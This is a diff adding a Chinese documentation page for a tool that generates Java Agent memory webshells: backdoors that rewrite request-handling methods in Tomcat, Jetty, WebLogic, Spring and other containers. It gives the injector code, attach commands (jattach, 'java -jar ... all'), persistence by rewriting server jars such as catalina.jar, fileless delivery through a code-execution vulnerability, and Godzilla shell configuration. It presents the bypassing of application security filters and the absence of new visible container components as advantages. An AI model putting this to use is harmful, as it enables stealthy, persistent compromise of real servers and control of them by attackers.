@@ -1,9 +1,475 @@
 ---
 title: Java Agent 内存马
+description: 基于 Instrumentation 改写容器请求入口，支持 attach、持久化与无文件投递
 ---
+
+Agent 内存马不向容器注册 Filter/Servlet，而是在目标 JVM 中挂载 `ClassFileTransformer`，直接改写请求必经方法的字节码。项目按服务端生成对应的注入器，并提供 Agent Jar、带 Attacher 的 Agent Jar 和 FilelessAgent 三种投递形态。
 
 ## Java Agent 原理
 
+### premain 与 agentmain
+
+Java Agent 通过 JVMTI 的 `Instrumentation` 接口获得修改类字节码的能力。Agent Jar 在 manifest 中声明入口类，JVM 按加载时机调用不同方法：
+
+| 加载时机 | 入口方法 | Manifest 属性 | 常见方式 |
+| --- | --- | --- | --- |
+| JVM 启动、`main` 之前 | `premain(String, Instrumentation)` | `Premain-Class` | `-javaagent:/path/agent.jar` |
+| JVM 运行中 | `agentmain(String, Instrumentation)` | `Agent-Class` | Attach API、`jattach` |
+
+```java
+public class Injector implements ClassFileTransformer {
+    public static void premain(String args, Instrumentation inst) {
+        launch(args, inst);
+    }
+
+    public static void agentmain(String args, Instrumentation inst) {
+        launch(args, inst);
+    }
+
+    @Override
+    public byte[] transform(ClassLoader loader, String className, Class<?> redefined,
+                            ProtectionDomain domain, byte[] bytes) {
+        return bytes;
+    }
+}
+```
+
+`agentmain` 是动态注入的入口：Attach API 把 agent jar 加载进目标 JVM 后，JVM 反射调用该方法，并把 attach 时传入的参数原样交给它。`jattach` 的写法是在 jar 路径后追加 `=参数`，例如 `agent.jar=persist=true`。
+
+### Instrumentation 与类重转换
+
+```java
+// 注册允许 retransform 的转换器
+inst.addTransformer(transformer, true);
+
+// 对已经加载的类立即生效
+inst.retransformClasses(targetClass);
+
+// 用给定字节码替换已加载的类，还原时使用
+inst.redefineClasses(new ClassDefinition(targetClass, originalBytes));
+
+// 移除转换器
+inst.removeTransformer(transformer);
+```
+
+`ClassFileTransformer#transform` 在类加载或 retransform 时被调用，返回新字节码；返回 `null` 表示不修改。retransform 会从原始 class 文件重新执行转换器，因此适合「先注册、再让已加载的类重新走一遍」的注入流程。
+
+retransform 和 redefine 都有结构限制：只能修改方法体、常量池等兼容内容，不能增删字段、方法或改变继承关系；不可修改的类（例如 IBM J9 的共享类）会抛 `UnmodifiableClassException`。
+
+Attach 还需要满足：
+
+- 与目标 JVM 同一用户，或具备足够的系统权限
+- 目标 JVM 未启用 `-XX:+DisableAttachMechanism`
+- 执行 attach 的一端具备 Attach API（JDK 8 的 `tools.jar`、JDK 9+ 的 `jdk.attach`），或者使用原生 `jattach`
+- 容器场景在目标容器内执行，宿主机上的进程号通常不可见
+
+### Agent Jar 的 manifest
+
+最小 Agent Jar 需要：
+
+```text
+Agent-Class: <injector>
+Premain-Class: <injector>
+Can-Redefine-Classes: true
+Can-Retransform-Classes: true
+```
+
+`Can-Redefine-Classes` 和 `Can-Retransform-Classes` 必须为 `true`，否则 `redefineClasses`/`retransformClasses` 会被拒绝。带 Attacher 的变体额外写入 `Main-Class`，让 jar 可以直接用 `java -jar` 启动。
+
 ## Java Agent 内存马实现方案
 
+| | 普通内存马 | Agent 内存马 |
+| --- | --- | --- |
+| 入口 | 向容器注册 Filter、Servlet、Valve、Listener 等 | 改写容器已有的请求入口方法 |
+| 生效方式 | 注入后处理新请求 | attach 后立即 retransform，或目标类后续加载时生效 |
+| URL | 依赖 `urlPattern` 或组件映射 | 不使用 `urlPattern`，请求到达切点即可 |
+| 重启 | 失效 | `persist=true` 写入 jar 后可保留 |
+| 容器视图 | 组件列表中可见 | 不新增组件 |
+| 前提 | 能执行代码并加载类 | 能 attach，或能执行 Fileless 引导类 |
+
+### 生成物
+
+Agent 类型由 `ShellType` 中以 `Agent` 开头的挂载类型表示。生成器按「服务端 + 挂载类型」选择注入器模板，再注入随机类名和 shell 字节码。注入器的职责如下：
+
+| 成员 | 作用 |
+| --- | --- |
+| `getClassName()` | shell 类名，生成时替换 |
+| `getBase64String()` | shell 字节码的 gzip + Base64，生成时替换 |
+| `premain`/`agentmain` | Agent 入口，转调 `launch` |
+| `launch` | 解析参数、注册 transformer、扫描并 retransform 已加载的目标类、可选持久化 |
+| `transform` | 命中目标类时定义 shell，并在方法入口插入触发代码 |
+| `defineTargetClass` | 把 shell 定义到目标类所属的 ClassLoader |
+| `persist` | 可选；模板声明后才启用持久化支持 |
+
+Agent Jar 内包含注入器及其内部类，ASM 被重定位到 `shade/org/objectweb/asm/`，避免与目标应用的 ASM 冲突。模板声明了 `persist` 方法时，生成器还会打入 `AgentPersistence` 及其内部接口；这也是 SpringWebMvc Agent 不支持持久化的原因。
+
+FilelessAgent 不是 jar：打包结果是单个 Java 6 class 的 Base64，内部携带完整的 Agent Jar 字节码。
+
+### 注入流程
+
+1. 目标 JVM 通过 `jattach` 或 jar 内的 Attacher 调用 `agentmain`。
+2. `launch` 解析 `restore`、`persist` 参数；`restore=true` 优先于 `persist=true`。
+3. 若当前注入器类已有静态 transformer，先 `removeTransformer`，再注册新的可 retransform 转换器。SpringWebMvc Agent 没有这一步。
+4. 遍历 `getAllLoadedClasses()`，找到目标类后调用 `retransformClasses`；需要持久化时同时改写目标 jar。
+5. `transform` 收到目标类字节码后，先把 shell 定义进该类的 ClassLoader，再用 ASM 在目标方法入口插入触发代码。
+6. 目标类尚未加载时，转换器保留在 JVM 中，等类加载时再生效；但本次 attach 不会补做持久化。
+
+触发代码等价于：
+
+```java
+Object[] args = new Object[]{ /* 目标方法的全部参数 */ };
+try {
+    if (new ShellClass().equals(args)) {
+        return; // 目标方法返回 int 时返回 2，见 GlassFish 切点
+    }
+} catch (Throwable ignored) {
+}
+// 未命中，继续执行原方法
+```
+
+每次请求经过切点都会创建一个 shell 实例并调用 `equals`，只有工具协议匹配时返回 `true`。未命中或 shell 初始化失败时异常被吞掉，原业务方法继续执行，因此切点不会因为 Agent 本身出错而中断；外壳的静态字段仍然可以在多次请求之间保存会话或 payload 状态。
+
+命中后方法直接返回，后续 Filter、Servlet 等逻辑不会执行，响应由 shell 写入。
+
+### Shell 的类加载
+
+Agent 类本身由 agent jar 的加载器加载，但 shell 必须定义到**目标类所属的 ClassLoader**，否则目标类中的 `new ShellClass()` 会找不到类，OSGi 容器尤其明显。注入器通过反射调用 `ClassLoader#defineClass` 完成定义，不能依赖 agent 的 AppClassLoader 加载，否则 OSGi bundle 无法解析到 shell。
+
+JDK 9+ 的模块系统会限制对 `ClassLoader#defineClass` 的反射访问。生成时目标 JRE 选择 Java 9（53）及以上会自动插入绕过代码；目标是 Java 8 但运行在 JDK 9+ 时，也可以手动开启。若目标类加载器无法看到工具依赖，shell 模板会通过线程上下文 ClassLoader 反射加载，参考 [实现自定义内存马](/docs/custom-memshell)。
+
+### 持久化与还原
+
+Agent 参数用逗号分隔，大小写不敏感：
+
+```text
+persist=true
+restore=true
+persist=true,other=value
+```
+
+`persist=true` 的流程：
+
+1. 确认目标类已加载，并从其 `ProtectionDomain` 的 `CodeSource` 定位实际 jar。
+2. 支持 `jar:`、`file:`、`vfs:` 协议；JBoss 的临时部署 jar 会解析到稳定的 `$JBOSS/server/deploy` 下的同名 jar。
+3. 用同一套 ASM 转换改写 jar 中的目标类，并把 shell 类作为新条目写入。
+4. 备份原始 jar 到 `/tmp/<原始 jar 文件名>.bak`，再用新 jar 替换原文件。
+
+持久化写入的是**下次启动**使用的 jar，当前 JVM 中的类在 attach 时已经被 retransform。重启后无需再次 attach，容器加载被改写的目标类时直接带上触发代码和 shell。
+
+```text
+MemShell Agent persisted /opt/tomcat/lib/catalina.jar
+Original jar backup: /tmp/catalina.jar.bak
+Restore with the same agent jar and restore=true, or after shutdown: cp -p /tmp/catalina.jar.bak /opt/tomcat/lib/catalina.jar
+```
+
+`restore=true` 的流程：
+
+1. 读取 `/tmp/<原始 jar 文件名>.bak`，不存在则报 `No persistence backup to restore`。
+2. 从备份中取出目标类的原始字节码，恢复 jar 内容与文件时间。
+3. 调用 `redefineClasses` 把当前 JVM 中已加载的目标类还原。
+4. 删除备份。
+
+还原不需要重启；若 `redefineClasses` 失败，jar 已恢复但运行中的类仍是改写后的版本，按日志提示重启服务器。
+
+持久化限制：
+
+- 目标类必须已经加载，否则报 `Cannot persist before ... is loaded` / `Cannot restore before ... is loaded`
+- 目标 jar 和 `/tmp` 必须可写
+- 目标类必须来自 jar；解压目录、Spring Boot 嵌套 jar 等 `CodeSource` 不是普通 jar 的场景不支持
+- 同一 jar 已有备份时拒绝再次持久化，需先还原
+- jar 中已存在同名 shell 条目时拒绝写入，重新生成随机类名即可
+- SpringWebMvc Agent 不包含 `persist` 方法，`persist`/`restore` 参数无效
+- FilelessAgent 不传 agent 参数，不能持久化
+
+Tomcat、BES、TongWeb、Apusic、Jetty、Resin、GlassFish/Payara、InforSuite、JBoss AS/EAP 6、WildFly/Undertow、WebLogic、WebSphere/Open Liberty、Primeton 等 Agent 挂载均有持久化集成用例。
+
+### 打包与投递
+
+| 打包方式 | 产物 | 依赖 | 特点 |
+| --- | --- | --- | --- |
+| `AgentJar` | Agent Jar | 外部 attach 工具 | 体积最小，manifest 无 `Main-Class` |
+| `AgentJarWithJDKAttacher` | 带 Attacher 的 Agent Jar | JDK 8 的 `tools.jar` 或 JDK 9+ 的 `jdk.attach` | 直接 `java -jar` attach |
+| `AgentJarWithJREAttacher` | 带 JNA Attacher 的 Agent Jar | 生成端需要 JNA；目标端仅需 JRE | 内嵌 JNA、JNA-platform 与 Windows DLL，体积最大 |
+| `FilelessAgent` | Base64 文本（单个 class） | 能执行 Java 代码的漏洞点 | 不落盘、不 attach，平台受限 |
+
+纯 `AgentJar` 配合 `jattach`：
+
+```bash
+./jattach <pid> load instrument false /opt/MemShellAgent.jar
+```
+
+带参数时：
+
+```bash
+./jattach <pid> load instrument false /opt/MemShellAgent.jar=persist=true
+./jattach <pid> load instrument false /opt/MemShellAgent.jar=restore=true
+```
+
+直接运行带 Attacher 的 jar：
+
+```bash
+java -jar /opt/MemShellAgent.jar <pid>
+java -jar /opt/MemShellAgent.jar <pid> persist=true
+java -jar /opt/MemShellAgent.jar <pid> restore=true
+java -jar /opt/MemShellAgent.jar all
+java -jar /opt/MemShellAgent.jar all persist=true
+java -jar /opt/MemShellAgent.jar all restore=true
+```
+
+Attacher 的第二个参数会原样作为 agent 参数传给每个目标 JVM，因此 `all` 也支持 `persist=true` 和 `restore=true`。`all` 会 attach 除自身外的所有 Java 进程，并逐个输出成功或失败；某个进程没有加载目标类、jar 不可写或没有备份时只影响该进程，不会中断其余进程。多 JVM 环境仍应优先使用明确 pid，避免对无关进程执行持久化或还原。没有参数运行 Attacher 会列出当前 Java 进程。
+
+纯 `AgentJar` 也可以作为启动参数加载：
+
+```bash
+java -javaagent:/opt/MemShellAgent.jar -jar app.jar
+```
+
+启动阶段目标类尚未加载，此时 `persist=true` 会因找不到目标类而失败，并可能直接导致 JVM 启动失败；需要持久化时，等目标类加载完成后再 attach 一次。
+
+生成带 Attacher 的变体要求生成端 classpath 中存在 JNA；否则下拉框中只出现 `AgentJar` 和 `FilelessAgent`。
+
+### 无文件 Agent
+
+`FilelessAgent` 只接受 Agent 挂载类型。打包结果是 Base64 文本，解码后只有一个 public、带 public 无参构造函数的 Java 6 类。目标通过漏洞点执行 `defineClass(...).newInstance()` 即可触发构造方法：
+
+1. 解码内嵌的 gzip 数据，动态定义 `JarLoader`、native provider 及其辅助类，每次产物使用独立包名。
+2. 在当前进程内获取同时具备 redefine/retransform 能力的真实 `Instrumentation`，不调用 `jattach`，不在目标写 Agent Jar。
+3. 从内存加载带 `Fileless-Agent-Contract: 1` 的 Agent Jar，依次查找 `agentmain(String, Instrumentation)`、单参数 `agentmain` 及对应 `premain`。
+4. 恢复线程上下文 ClassLoader；`toString()` 不会重复注入。
+
+支持边界：
+
+| 路径 | 状态 |
+| --- | --- |
+| 目标侧类文件版本 | runtime、Bootstrap 与验证 fixture 均为 class-file 50 |
+| 外部 `Instrumentation` + 内存加载 | JRE 6、8、17、21、25 验证路径 |
+| 无外部 Agent 获取 `Instrumentation` | Windows/x64 HotSpot；Linux/amd64、Linux/arm64 的 HotSpot 与 OpenJ9 |
+| 未支持 | Windows 其他架构、Windows 上的 OpenJ9；未知 JRE 在修改 native 状态前拒绝 |
+
+已有真实 `Instrumentation` 时，也可以直接调用：
+
+```java
+ClassLoader agentLoader = FilelessAgentBootstrap.install(
+        agentJar, agentArgs, instrumentation, parentLoader);
+```
+
+### 生成与使用
+
+图形界面：
+
+1. 服务类型选择目标中间件；BES 9.5.1 选 Tomcat，Apusic 10、Primeton 6.5 选 GlassFish，JBoss EAP 7/8 与 WildFly 选 Undertow。
+2. 挂载类型选择 Agent 类型。
+3. 选择内存马工具并填写连接参数。
+4. 打包方式选择上表中的任一项，生成后下载 jar 或复制 Base64。
+
+连接方式与普通内存马相同，使用生成时填写的工具参数连接任意能到达切点的路径。
+
+REST 接口 `POST /api/memshell/generate`：
+
+```json
+{
+  "shellConfig": {
+    "server": "Tomcat",
+    "serverVersion": "10.1",
+    "shellTool": "Godzilla",
+    "shellType": "AgentFilterChain",
+    "targetJreVersion": 61
+  },
+  "shellToolConfig": {
+    "pass": "pass",
+    "key": "key",
+    "headerName": "User-Agent",
+    "headerValue": "Mozilla/5.0"
+  },
+  "packer": "AgentJar"
+}
+```
+
+响应中的 `packResult` 是 Base64 文本；选择 `AgentJar`、`AgentJarWithJDKAttacher`、`AgentJarWithJREAttacher` 时解码得到 jar，选择 `FilelessAgent` 时解码得到 class。
+
+SDK：
+
+```java
+MemShellResult result = new MemShellGenerator().generate(
+        ShellConfig.builder()
+                .server(Server.Tomcat)
+                .shellTool(ShellTool.Godzilla)
+                .shellType(ShellType.AGENT_FILTER_CHAIN)
+                .build(),
+        InjectorConfig.builder().build(),
+        GodzillaConfig.builder().pass("pass").key("key")
+                .headerName("User-Agent").headerValue("Mozilla/5.0").build());
+
+String base64 = PackerRegistry.getInstance().pack(Packers.AgentJar, result);
+```
+
+需要原始 jar 字节时：
+
+```java
+byte[] jarBytes = ((JarPacker) PackerRegistry.getInstance().get(Packers.AgentJar))
+        .packBytes(JarPackerConfig.from(result));
+```
+
+MCP 通过 `memshell_capabilities` 查询当前可用的服务端、工具、挂载类型与打包方式，再调用 `generate_memshell`，参数与 REST 一致。
+
+### 参数说明
+
+| 参数 | 说明 |
+| --- | --- |
+| `shellType` | 必须选择 Agent 挂载类型，见下一节支持范围 |
+| `packer` | `AgentJar`、`AgentJarWithJDKAttacher`、`AgentJarWithJREAttacher`、`FilelessAgent` |
+| `targetJreVersion` | shell/注入器的 class 文件版本；50=Java 6、52=Java 8、61=Java 17、65=Java 21，默认 50；53 及以上自动绕过模块限制 |
+| `debug` | 开启后注入器打印启动与命中信息；持久化/还原日志不受该开关影响 |
+| `urlPattern` | Agent 类型忽略，无需配置 |
+| `staticInitialize` | Agent 类型忽略，生成器不会添加静态代码块 |
+| `回显模式` | Agent 类型不经过回显 Wrapper，开启不生效 |
+| `shellClassName` | shell 类名，默认随机；持久化时不能与目标 jar 中已有类重名 |
+| `injectorClassName` | 注入器类名，默认随机，即 manifest 中的 `Agent-Class` |
+| `代码混淆` | 支持；OSGi 容器的 Agent shell 会强制关闭 AES 字符串加密 |
+
+GodzillaSession 依赖 HttpSession，只提供能拿到 request/session 的 Agent 模板：`AgentFilterChain`、`AgentContextValve`、`AgentFrameworkServlet`、`AgentServletContext`、`AgentFilterManager`；Jetty/Undertow 的 Agent 类型不可选。其余内置工具是否可用取决于挂载类型，界面只列出有模板的组合。
+
 ## 切点选取
+
+### 选取原则
+
+Agent 切点必须满足：
+
+- 每个目标请求都会经过，且参数能拿到 request/response 或可从中取得
+- 版本之间类名、方法名稳定，或能用少量候选类覆盖
+- 可被 retransform，且不是容器启动后只执行一次的方法
+- 命中时能安全地提前返回，不破坏容器后续状态
+
+容器级切点通常位于应用 Filter 之前，能绕过应用自身的安全 Filter；Spring 级切点选在 `DispatcherServlet` 的父类，只覆盖映射到 Spring MVC 的请求。代价是每个请求都会多一次 shell 实例化和协议判断。
+
+### 支持范围
+
+| 服务类型 | Agent 挂载类型 | 版本与备注 |
+| --- | --- | --- |
+| Tomcat | `AgentFilterChain`、`AgentContextValve` | 5 ~ 11；Spring Boot 内嵌 Tomcat 同样选 Tomcat |
+| Jetty | `AgentHandler` | 6 ~ 12，含 ee8 ~ ee11 |
+| JBoss | `AgentFilterChain`、`AgentContextValve` | JBoss AS 4 ~ 7.1、EAP 6；JBossWeb 复用 Tomcat 切点 |
+| Undertow | `AgentServletHandler` | Undertow 1.x ~ 2.3+；WildFly 9 ~ 41、EAP 7/8 |
+| Resin | `AgentFilterChain` | 3 ~ 4 |
+| WebLogic | `AgentServletContext` | 10.3.6 ~ 15 |
+| WebSphere | `AgentFilterManager` | 7 ~ 9、Open Liberty；7 需开启 debug 模式 |
+| GlassFish | `AgentFilterChain`、`AgentContextValve` | 3 ~ 8、Payara 5 ~ 7；Primeton 6.5 选 GlassFish |
+| TongWeb | `AgentFilterChain`、`AgentContextValve` | 6 ~ 8 |
+| BES | `AgentFilterChain`、`AgentContextValve` | 9.5.2 ~ 11；9.5.1 选 Tomcat |
+| InforSuite | `AgentFilterChain`、`AgentContextValve` | 9 ~ 10 |
+| Apusic | `AgentFilterChain` | 9.0、9.0.1；Apusic 10 选 GlassFish |
+| SpringWebMvc | `AgentFrameworkServlet` | Spring 3 ~ 6、Spring Boot 1 ~ 3 |
+
+`Resin2`、`Jetty5`、`SpringWebFlux`、`XXL-JOB`、`Struts2`、`Dubbo` 没有 Agent 挂载类型。
+
+Agent 挂载类型没有 `Jakarta` 前缀。Tomcat 10+、Jetty 12 ee10+、BES 11、WebLogic 15、Spring 6/Boot 3 等 Jakarta 环境，直接选择对应服务类型的 Agent 类型即可。
+
+### 目标方法
+
+Tomcat、JBoss AS/EAP 6、GlassFish/Payara/Primeton、InforSuite 共用 Catalina 切点：
+
+- `AgentFilterChain`：`org.apache.catalina.core.ApplicationFilterChain#doFilter`
+- `AgentContextValve`：`org.apache.catalina.core.StandardContextValve#invoke`
+
+GlassFish/Payara 的 `StandardContextValve#invoke` 返回 `int`，命中时注入器返回 `2`（`GlassFishValve.END_PIPELINE`）；Tomcat 的返回 `void`。
+
+BES：
+
+- `AgentFilterChain`：`com.bes.enterprise.webtier.core.ApplicationFilterChain#doFilter`
+- `AgentContextValve`：`com.bes.enterprise.webtier.core.DefaultContextValve#invoke`
+
+TongWeb 会按已加载类匹配以下包名，不依赖服务版本手工选择：
+
+- `com.tongweb.web.thor.core.ApplicationFilterChain#doFilter`
+- `com.tongweb.catalina.core.ApplicationFilterChain#doFilter`
+- `com.tongweb.server.core.ApplicationFilterChain#doFilter`
+- `com.tongweb.container.core.ApplicationFilterChain#doFilter`
+- 以上包名下的 `StandardContextValve#invoke`
+
+Apusic：
+
+- `AgentFilterChain`：`com.apusic.web.container.FilterChainImpl#performFilter`
+
+Jetty：
+
+| 版本 | 目标类 | 方法 |
+| --- | --- | --- |
+| 6.x | `org.mortbay.jetty.servlet.ServletHandler` | `handle` |
+| 7 ~ 11 | `org.eclipse.jetty.servlet.ServletHandler` | `doHandle` |
+| 12 ee8/ee9 | `org.eclipse.jetty.ee8.servlet.ServletHandler` / `org.eclipse.jetty.ee9.servlet.ServletHandler` | `doHandle` |
+| 12 ee10/ee11 | `org.eclipse.jetty.ee10.servlet.ServletHandler$Chain` / `org.eclipse.jetty.ee11.servlet.ServletHandler$Chain` | `doFilter` |
+
+Resin：
+
+- `com.caucho.server.http.FilterChainFilter#doFilter`
+- `com.caucho.server.dispatch.FilterFilterChain#doFilter`
+
+Undertow：
+
+- `AgentServletHandler`：`io.undertow.servlet.handlers.ServletInitialHandler#handleFirstRequest`
+
+WebLogic：
+
+- `AgentServletContext`：`weblogic.servlet.internal.WebAppServletContext#securedExecute`
+
+WebSphere/Open Liberty：
+
+- `AgentFilterManager`：`com.ibm.ws.webcontainer.filter.WebAppFilterManager#doFilter`
+
+SpringWebMvc：
+
+- `AgentFrameworkServlet`：`org.springframework.web.servlet.FrameworkServlet#service`
+
+### 选择建议
+
+- 已知是 Tomcat 系容器时优先 `AgentContextValve`：位于 Filter 链之前，能覆盖应用 Filter 拦截不到的位置；需要更贴近 Filter 语义时选 `AgentFilterChain`。
+- 同一个容器里部署多个应用时，容器级 Agent 切点对所有应用生效；不需要逐个应用注入。
+- 只关心 Spring MVC 请求，或容器版本/包名难以判断时，选 `AgentFrameworkServlet`。它在容器 Filter 之后，且不支持持久化。
+- 同一容器存在多个应用且只想影响一个应用时，容器级切点无法区分应用；Spring 切点也按类加载器生效，不能保证只影响单个应用。需要单应用隔离时使用普通内存马。
+- Jetty 12 的 ee8/ee9 使用 `ServletHandler#doHandle`，ee10/ee11 使用 `ServletHandler$Chain#doFilter`；注入器按已加载类自动匹配，不需要手工选择 eeN。
+- 旧版 Resin、TongWeb、Jetty 的包名差异由多候选目标类覆盖，不要手工修改服务版本去猜测包名。
+
+## 限制与排错
+
+### 常见问题
+
+| 现象 | 原因 | 处理 |
+| --- | --- | --- |
+| `No compatible attachment provider is available` | 执行 attach 的 JRE 没有 `tools.jar`/`jdk.attach` | 使用 `AgentJarWithJREAttacher`，或改用 `jattach` |
+| `Could not connect to socket: Connection refused` | attach 机制被禁用、用户不同，或容器重启后残留 attach socket | 检查启动参数与用户；清理 `/tmp/.java_pid<pid>`、`/tmp/.attach_pid<pid>` 后重试 |
+| `UnmodifiableClassException` | 目标类是共享类或不允许修改 | IBM JDK 6 环境给目标 JVM 加 `-Xshareclasses:none` |
+| `UnsupportedClassVersionError` | `targetJreVersion` 高于目标 JVM | 重新选择不高于目标版本的 class 版本 |
+| 注入日志显示 working，但工具连不上 | shell 类定义失败、类版本不符、切点未覆盖请求或工具参数错误 | 开启调试模式，检查输出；OSGi 环境关闭额外混淆后重试 |
+| `Cannot persist before ... is loaded` | 目标类尚未加载，或启动阶段用了 `-javaagent` | 先发一次请求让目标类加载，再 attach 并带 `persist=true` |
+| `No persistence backup to restore` | 没有执行过持久化，或备份已删除 | 确认使用的是同一个 jar 文件名；必要时手工恢复 |
+| `Backup already exists; restore it before persisting again` | 同一 jar 已有一份 `/tmp` 备份 | 先 `restore=true`，或手工还原后重试 |
+| `Agent target code source is not a jar` | 目标是解压目录、Spring Boot 嵌套 jar 等 | 使用非持久化模式，或改用普通内存马 |
+| `Target class not found in ...` | jar 或备份中缺少目标类条目 | 确认持久化的是实际加载目标类的 jar；JBoss 检查稳定部署 jar |
+| `Jar restored, but the running class could not be restored; restart the server` | jar 已还原，但 `redefineClasses` 失败 | 重启目标服务器，让运行中的类失效 |
+| `Cannot modify a class loaded from ...` | `CodeSource` 不是支持的 `jar:`/`file:`/`vfs:` | 确认中间件部署布局；JBoss 临时部署会自动解析到稳定 jar |
+| `Shell class already exists in ...` | 随机类名与 jar 中已有类冲突 | 重新生成，换一个 `shellClassName` |
+| 重启后 Agent 失效 | 没有使用 `persist=true`，或持久化写到了错误的 jar | 查看持久化日志中的 jar 路径；重新 attach 并持久化 |
+
+### 日志与重复注入
+
+调试模式开启后，注入器会打印：
+
+```text
+MemShell Agent is starting
+MemShell Agent is working at org.apache.catalina.core.ApplicationFilterChain.doFilter
+```
+
+持久化/还原会打印实际 jar 与备份路径，这些日志由 `AgentPersistence` 输出，关闭调试模式也不会消失。
+
+同一个 jar 重复 attach 时，注入器会先移除自己保存的旧 transformer，再注册新的。默认重新生成会得到新的随机类名，旧 transformer 不会被新 jar 移除；多份 Agent 同时存在时可能互相叠加，切换产物前应重启容器，或继续使用原 jar 执行 `restore=true`。SpringWebMvc Agent 每次 attach 都会新增 transformer，不要重复 attach。
+
+### OSGi 与混淆
+
+GlassFish/Payara/Primeton、InforSuite、WebSphere/Open Liberty 的 Agent shell 会被定义到 OSGi bundle 的 ClassLoader 中，bundle 通常没有导入 `javax.crypto`。生成器会为这些 Agent 类型强制关闭 class-obf 的 AES 字符串加密；手工覆盖该选项会导致 shell 初始化失败。工具协议自身的加密走线程上下文 ClassLoader 反射，不受影响。
+
+### 其他限制
+
+- Agent 类型忽略 `urlPattern`、`staticInitialize`、回显模式和探测模式；这些选项不会报错，但不会改变产物行为
+- WebSphere 7 的 Agent 注入需要开启 debug 模式；Open Liberty 的服务类型选择 WebSphere
+- FilelessAgent 不支持持久化与还原，目标 JRE 不在支持矩阵内时会拒绝安装
+- Agent shell 只在切点被调用时触发；例如 Spring 切点不覆盖未进入 `DispatcherServlet` 的静态资源和其他 Servlet，被前置 Valve 直接返回的请求也不会到达后置切点
